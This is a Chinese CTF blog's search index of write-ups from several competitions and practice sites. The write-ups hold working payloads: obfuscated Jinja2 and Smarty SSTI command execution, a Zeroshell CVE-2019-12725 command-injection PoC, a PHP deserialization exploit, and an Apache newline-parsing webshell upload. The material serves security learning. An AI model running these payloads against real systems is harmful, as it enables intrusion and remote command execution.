<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/02/07/hello-world/"/>
      <url>/2025/02/07/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn2024 （复现）</title>
      <link href="/2024/12/19/ciscn2024/"/>
      <url>/2024/12/19/ciscn2024/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Safe-Proxy"><a href="#Safe-Proxy" class="headerlink" title="Safe_Proxy"></a>Safe_Proxy</h2><h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>比赛的时候和队友一起也没做出来，构造一个ssti的payload绕过黑名单还是不难的，但是无回显卡住了，赛后看wp学到了两个方法。</p><p>法1：对app.py进行写入操作</p><p><strong>payload：</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=&#123;%<span class="built_in">set</span> o1=(dict(o=a,s=n))|<span class="built_in">join</span>%&#125;&#123;%<span class="built_in">set</span> re=(dict(re=a,ad=n))|<span class="built_in">join</span>%&#125;&#123;%<span class="built_in">set</span> pppct=(dict(po=a,pen=n))|<span class="built_in">join</span>%&#125;&#123;%<span class="built_in">set</span>%20a=(lipsum|string|list)|attr(%27pop%27)(18)%&#125;&#123;%<span class="built_in">set</span>%20glob=(a,a,(dict(glo=a,bals=b)|<span class="built_in">join</span>),a,a)|<span class="built_in">join</span>%&#125;&#123;%<span class="built_in">set</span> gt=(a,a,(dict(geti=a,tem=n)|<span class="built_in">join</span>),a,a)|<span class="built_in">join</span>%&#125;&#123;&#123;lipsum|attr(glob)|attr(gt)(o1)|attr(pppct)(<span class="string">&#x27;cat /flag&#x27;</span>)|attr(re)()&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>复现的时候在本机上搭建了环境，用用hackerbar执行后看终端返回无法识别cat命令，就很抑或，后面知道了真的给自己蠢笑了，windows根本没有cat命令，然后去搜了windows的相关命令emm。。还是没搞出来。然后就去kali搭建了环境，直接执行上面的payload发现读不到flag，那就先ls /看看。</p><p><img src="/img/ciscn2024&ccb/1.png" width="%50" /></p><p><img src="/img/ciscn2024&ccb/2.png" width="%50" /></p><p>发现根目录下没有flag，一个一个读的话有点麻烦，搜了一下用其他命令代替，find / -name “flag” -exec cat {} \;执行这个命令直接就把flag写出来了。</p><p><img src="/img/ciscn2024&ccb/3.png" width="%50" /></p><p>法2：把执行命令后的结果并将输出格式化为 <!-- HTML <pre> --> 标签内的文本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code=&#123;%<span class="built_in">set</span> gl=<span class="string">&#x27;_&#x27;</span>*2+<span class="string">&#x27;globals&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*2%&#125;&#123;%<span class="built_in">set</span> bu=<span class="string">&#x27;_&#x27;</span>*2+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*2%&#125;&#123;%<span class="built_in">set</span> im=<span class="string">&#x27;_&#x27;</span>*2+<span class="string">&#x27;i&#x27;</span><span class="string">&#x27;mport&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*2%&#125;&#123;%<span class="built_in">set</span> ay=<span class="string">&#x27;so&#x27;</span>[::-1]%&#125;&#123;&#123;cycler.next[gl][bu][<span class="string">&#x27;ev&#x27;</span>+<span class="string">&#x27;al&#x27;</span>](<span class="string">&quot;_&quot;</span>+<span class="string">&quot;_imp&quot;</span>+<span class="string">&quot;ort_&quot;</span>+<span class="string">&quot;_(&#x27;s&quot;</span>+<span class="string">&quot;ys&#x27;).modules[&#x27;_&quot;</span>+<span class="string">&quot;_main_&quot;</span>+<span class="string">&quot;_&#x27;]._&quot;</span>+<span class="string">&quot;_dict_&quot;</span>+<span class="string">&quot;_[&#x27;app&#x27;].before_request_funcs.setdefault(None,[]).append(lambda:&#x27;&lt;pre&gt;&#123;0&#125;&lt;/pre&gt;&#x27;.format(_&quot;</span>+<span class="string">&quot;_impo&quot;</span>+<span class="string">&quot;rt_&quot;</span>+<span class="string">&quot;_(&#x27;o&quot;</span>+<span class="string">&quot;s&#x27;).po&quot;</span>+<span class="string">&quot;pen(&#x27;cat /flag&#x27;).read()))&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>不知道为啥复现用这个payload没出。</p><h2 id="hello-web"><a href="#hello-web" class="headerlink" title="hello_web"></a>hello_web</h2><h3 id="解题思路：-1"><a href="#解题思路：-1" class="headerlink" title="解题思路："></a>解题思路：</h3><p>这道题当时做的贼难受，源代码给了hackme.php和tips.php两个文件，没法直接访问。尝试伪协议读取文件试了很多都被ban，目录穿越当时只试了一下../../行不通，又急又做不出来，赛后看wp发现只要双鞋绕过就行了，file=…//tips.php还是经验太少了,hackme。php包含了一个一句话木马，把密码搞出来蚁剑连接就可以了。</p><h1 id="Misc-危险检测与流量分析"><a href="#Misc-危险检测与流量分析" class="headerlink" title="Misc-危险检测与流量分析"></a>Misc-危险检测与流量分析</h1><h2 id="zeroshell-1-3"><a href="#zeroshell-1-3" class="headerlink" title="zeroshell_1~3"></a>zeroshell_1~3</h2><h3 id="解题思路：-2"><a href="#解题思路：-2" class="headerlink" title="解题思路："></a>解题思路：</h3><p>之前没做过流量分析的题，比赛的时候都是队友做出来的。。。</p><p>第一题把数据包拖到wireshark里面看，根据题目描述应该是一个http请求，然后看到一个比较奇怪的请求，referer里有一串base64编码，解码后就是flag。同时也得到了poc：/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=’%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20—checkpoint=1%20—checkpoint-action=exec=’ps%20-ef’%0A’用来写第二题。</p><p>还可以根据题目描述可以直接搜到zeroshell的漏洞ZoreShell防火墙版本小于3.9.0存在命令执行（CVE-2019-12725），然后搜到poc。</p><p>第二题就直接修改一下poc利用rce漏洞执行‘ls /’，flag在/Database/flag里，直接cat就行。</p><p>第三题根据题目描述“找出受控机防火墙设备中驻留木马的外联域名或IP地址，结果提交形式：flag{xxxx}，如flag{www.abc.com} 或 flag{16.122.33.44}”，继续修改poc执行netstat -ano命令，发现出站，包起来就是flag了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF刷题记——Web篇</title>
      <link href="/2024/12/12/BUUCTF/"/>
      <url>/2024/12/12/BUUCTF/</url>
      
        <content type="html"><![CDATA[<p>这篇文章记录了我在BUUCTF的刷题之旅，会持续更新。</p><h1 id="1-BUU-CODE-REVIEW-1"><a href="#1-BUU-CODE-REVIEW-1" class="headerlink" title="1.BUU CODE REVIEW 1"></a>1.BUU CODE REVIEW 1</h1><h2 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BUU</span> </span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$correct</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$input</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;correct = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">uniqid</span>());</span><br><span class="line">           <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;correct === <span class="variable language_">$this</span>-&gt;input) &#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pleaseget&#x27;</span>] === <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pleasepost&#x27;</span>] === <span class="string">&#x27;2&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md51&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md52&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;md51&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;md52&#x27;</span>]) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;obj&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目源码很清晰，分为两个部分，第一部分发现echo file_get_contents(“/flag”);想办法实例化这个类并调用该方法，第二部分找到反序列化obj，先进行简单的md5绕过，数组绕过和科学计数法绕过都可以。然后构造exp。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BUU</span> </span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$correct</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$input</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;correct = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">uniqid</span>());</span><br><span class="line">           <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;correct === <span class="variable language_">$this</span>-&gt;input) &#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$exp</span>=<span class="keyword">new</span> <span class="title function_ invoke__">BUU</span>();</span><br><span class="line"><span class="variable">$exp</span>-&gt;input=&amp;<span class="variable">$exp</span>-&gt;correct;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个exp的构造是学习了一个师傅的wp，又学到新知识了，这个师傅是这样解释的，我感觉很到位，为什么要这么构造呢？因为uniqid() 产生的数是随时变化的，无法预测，所以input 传值多少无法确定。那么我们就得把值确定下来，这个引用就类似c++指针一样，引用是一种使两个变量共享同一内存空间的机制。还给了例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">5</span>;</span><br><span class="line"><span class="variable">$b</span> = &amp;<span class="variable">$a</span>; <span class="comment">// $b 是 $a 的引用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>; <span class="comment">// 输出 5</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>; <span class="comment">// 输出 5</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="number">10</span>; <span class="comment">// 修改 $b 的值，也会影响 $a</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>; <span class="comment">// 输出 10</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>; <span class="comment">// 输出 10</span></span><br></pre></td></tr></table></figure><p>然后得到obj=O:3:”BUU”:2:{s:7:”correct”;s:0:””;s:5:”input”;R:2;}</p><p><img src="/img/BUU_Web/1.png" width="%50" /></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF刷题——Web篇</title>
      <link href="/2024/12/12/NSSCTF/"/>
      <url>/2024/12/12/NSSCTF/</url>
      
        <content type="html"><![CDATA[<p>记录了我在NSSCTF的刷题之旅，会持续更新。</p><h1 id="1-CISCN-2019华东南-Web11"><a href="#1-CISCN-2019华东南-Web11" class="headerlink" title="1.[CISCN 2019华东南]Web11"></a>1.[CISCN 2019华东南]Web11</h1><h2 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h2><p>打开靶场发现右上角有：Current IP:120.207.145.180最下面有：Build With Smarty !查Smarty是SSTI漏洞（模板注入漏洞），PHP中的SSTI猜测IP是由XFF控制。</p><p>burp抓包，添加：X-Forwarded-For: {4*4}显示：Current IP:16证明猜测正确。</p><p>然后利用该漏洞实现rec，例如X-Forwarded-For: {system(‘cat /flag’)}成功得到flag。</p><p><strong>Smarty SSTI</strong></p><p>Smarty是一个PHP的模板引擎，提供让程序逻辑与页面显示（HTML/CSS）代码分离的功能。<br>Smarty是基于PHP开发的，对于Smarty的SSTI的利用手段与常见的flask的SSTI有很大区别。<br>一般情况下输入{$smarty.version}就可以看到返回的smarty的版本号。该题目的Smarty版本是3.1.30</p><h1 id=""><a href="#" class="headerlink" title=" "></a> </h1><h2 id="-1"><a href="#-1" class="headerlink" title=" "></a> </h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GeekChallenge2024 （复现）</title>
      <link href="/2024/12/05/GeekChallenge2024-%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"/>
      <url>/2024/12/05/GeekChallenge2024-%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/</url>
      
        <content type="html"><![CDATA[<p>赛后跟着官方wp复现的。</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="baby-upload"><a href="#baby-upload" class="headerlink" title="baby_upload"></a>baby_upload</h2><h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><h4 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h4><p>可以再url后面乱加点东西，返回404页面可以看到阿帕奇版本号————Apache/2.4.10,网上查询到该版本存在道CVE-2017-15715这个解析漏洞。</p><p><strong>CVE-2017-15715：</strong><br>**Apache換行解析漏洞（CVE-2017-15715）是一种解析漏洞，可以影响httpd 2.4.0至2.4.29版本中的PHP解析。攻击者可以通过在上传的文件名中添加特定的换行符，绕过服务器的安全策略，使其被解析成PHP文件而不是普通文件。此漏洞会影响具有以下条件的服务器：</p><pre><code>未正确配置的服务器未对文件名进行适当验证的服务器使用正则表达式并启用Multiline属性的服务器</code></pre><p>攻击者可以将1.php\x0A作为文件名上传到服务器上，这个文件名看起来像是一个普通的非PHP文件，但是由于其中的特定字符，服务器会将其解析为PHP文件。此外，在上传文件时添加换行符也可以使文件被成功解析，从而绕过系统的黑名单检测。（x0A 是一个十六进制的转义字符，表示换行符）。</p><p>Hex修改一下在文件名1.php后加上0A换行就行了。</p><p><img src="/img/GeekChallenge2024/1.png" width="%50" /></p><p>根据写入的一句话木马用蚁剑连接一下，flag就在根目录下。</p><h4 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h4><p>白名单后缀绕过，后端代码写的有问题，只对第一个后缀名进行了黑名单检测所以修改文件名为1.jpg.php（jpg改为png也行），然后也是蚁剑连接一下就好了。flag：<br> SYC{3e48f6ad-2de5-4254-b249-978f43d35e0f}</p><h2 id="ez-http"><a href="#ez-http" class="headerlink" title="ez_http"></a>ez_http</h2><h3 id="解题思路：-1"><a href="#解题思路：-1" class="headerlink" title="解题思路："></a>解题思路：</h3><p>一道简单的签到题，但是考http请求头还是挺全面的，不知道为啥用hackerbar没整出来，用bp发包才成功get到一个新知识，除了X-Forwarded-For,X-Real-Ip也可以用于伪造ip</p><p><img src="/img/GeekChallenge2024/2.png" width="%50" /></p><p><img src="/img/GeekChallenge2024/3.png" width="%50" /></p><h2 id="funnySQL"><a href="#funnySQL" class="headerlink" title="funnySQL"></a>funnySQL</h2><h3 id="解题思路：-2"><a href="#解题思路：-2" class="headerlink" title="解题思路："></a>解题思路：</h3><p>黑名单如下：<br>if(preg_match(‘/and|or| |\n|—|sleep|=|ascii/i’,$str)){<br>die(‘不准用！’);</p><p>然后题目无回显无报错，要打的注入方式就是为时间盲注了，然后想想怎么绕过，or被ban了，意味着information和performance这俩库都查不了了，所以我们只能通过mysql.innodb_table_stats 来查到表名<br>sleep被ban了，用benchmark绕就行了,=号可以用like,regexp等来绕，也可以用&gt;或者&lt;号来绕空格被ban了可以用/**/或者是()来绕。</p><p>exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="ez-jpg"><a href="#ez-jpg" class="headerlink" title="ez_jpg"></a>ez_jpg</h2><h3 id="解题思路：-3"><a href="#解题思路：-3" class="headerlink" title="解题思路："></a>解题思路：</h3><p>下载附件得到flag.txt，内容明显是base64编码，解码可以发现是文件数据流，文件尾明显是FFD8FFE0的逆序，是jpg图片逆序，利用脚本还原数据流。</p><p><img src="/img/GeekChallenge2024/4.png" width="%50" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 数据流逆序还原</span></span><br><span class="line"><span class="comment"># 定义输入输出文件名</span></span><br><span class="line">input_file = <span class="string">&#x27;C:/Users/19766/Desktop/flag.jpg&#x27;</span></span><br><span class="line">output_file = <span class="string">&#x27;reversed_flag.jpg&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取文件内容，并指定编码方式（这里假设是UTF-8）</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    data = file.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逆序数据</span></span><br><span class="line">reversed_data = data[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将逆序后的数据写入新文件，并指定同样的编码方式</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(reversed_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;已成功将 <span class="subst">&#123;input_file&#125;</span> 文件中的数据逆序并保存到 <span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>还原后出来这么个东西，明显宽高不对，拖到010看看，损害的宽高是0280 0210，我这里已经修复修改成0280 0280差不多，得到flag。</p><p><img src="/img/GeekChallenge2024/5.png" width="%50" /></p><p><img src="/img/GeekChallenge2024/6.png" width="%50" /></p><p><img src="/img/GeekChallenge2024/flag.jpg" width="%50" /></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CYBERGON_CTF 2024 (复现)</title>
      <link href="/2024/12/04/CYBERGON-2024/"/>
      <url>/2024/12/04/CYBERGON-2024/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Trickery-Number"><a href="#Trickery-Number" class="headerlink" title="Trickery Number"></a>Trickery Number</h2><h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>开启题目，发现需要我们知道y的值才能得到flag，先输入个1，发现url尾巴加上了/？y=1，然后下载题目附件看看，代码审计看到一段重要的代码.</p><p><img src="/img/CYBERGON_CTF2024/2.png" width="%50" /></p><p><img src="/img/CYBERGON_CTF2024/1.png" width="" /></p><p>第38-41行代码用于输出flag，看一下if条件，去搜了以下BigInt和parseInt两个函数，发现BigInt函数存在阈值，它只能表示2^53-1以内的整数，再看到35-37行代码，y最大长度不大于17，而2^53-1刚好才16位，所以我们只要让y=一个17位的数字即可。</p><p><img src="/img/CYBERGON_CTF2024/3.png" width="%50" /></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一届“吾杯”网络安全技能大赛 (复现)</title>
      <link href="/2024/12/03/WuCup2024/"/>
      <url>/2024/12/03/WuCup2024/</url>
      
        <content type="html"><![CDATA[<p>题目环境只保留了四个小时，wp也没出，没来得及复现，其他题也复现不了了，只能看看其他师傅的wp学习学习。</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="原神启动"><a href="#原神启动" class="headerlink" title="原神启动"></a>原神启动</h2><h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>下载附件得到两个文件，发现压缩文件解压需要密码，先看看png图片，放到stegsolve里面看看。</p><p><img src="/img/Wu_Cup2024/7.png" width="" /></p><p><img src="/img/Wu_Cup2024/1.png" width="50%" /></p><p>emm假flag，那应该就是解压密码，flag格式的密码真的难绷，解压得到一个docx文件，打开滚到35页好像发现flag，看不清，拿到stegsolve看看。</p><p><img src="/img/Wu_Cup2024/8.png" width="50%" /></p><p><img src="/img/Wu_Cup2024/3.png" width="50%" /></p><p>还是假的，把这个docx文件以zip打开，发现目录下还有一个img.zip,里面有个text.zip,需要解压密码，把刚得到的假flag拿去解压发现密码不对，看看目录下其他文件，最终在word文件夹里的document.xml,找到解压密码。</p><p><img src="/img/Wu_Cup2024/5.png" width="50%" /></p><p><img src="/img/Wu_Cup2024/4.png" width="50%" /></p><p>再拿去解压得到flag。</p><p><img src="/img/Wu_Cup2024/6.png" width="" /></p><p>原神套娃，真的唐。</p><h1 id="Crypto-这题当时AI一把梭秒了"><a href="#Crypto-这题当时AI一把梭秒了" class="headerlink" title="Crypto (这题当时AI一把梭秒了)"></a>Crypto (这题当时AI一把梭秒了)</h1><h2 id="Easy"><a href="#Easy" class="headerlink" title="Easy"></a>Easy</h2><h3 id="解题思路：-1"><a href="#解题思路：-1" class="headerlink" title="解题思路："></a>解题思路：</h3><p>下载附件解压得到两个文件，密文，加密算法和key都给了，当时比赛就直接丢给通义给了个脚本秒了。</p><p><img src="/img/Wu_Cup2024/9.png" width="50%" /></p><p><img src="/img/Wu_Cup2024/10.png" width="50%" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">encoded_str = <span class="string">&quot;MkpIbmdFcWs4MzVjR3BHRXFVVnZtZWJUQWtSTlNNamE1dGZYQTdwR25ac203SnJQV2FyTUdHQnA3Uk1XZDNZVFlTNTJjemVya1BCN0dBY2NBNkN4U1VBS29TalVBOU1tR1EyYUF0UVlHZTFYOXp1TThWS2o1OHdKRFJaVXhzTGRaZUpaTGV6NUFWc2JHdm5CbTdjV28yNTRyWGpzQURYdEhkSmJmWmtGREVEQWZWeEhFeDNYanNNODZMZVo2cnM2NExGbU5QeG1mUXBqQ3BoY3pCczlRa3kySnFZb1JzSnFtUnk0cW02WFgyOU50N1g2Vg==&quot;</span></span><br><span class="line">decoded_bytes = base64.b64decode(encoded_str)</span><br><span class="line">decoded_str = decoded_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(decoded_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4</span>(<span class="params">key, data</span>):</span><br><span class="line">    S = <span 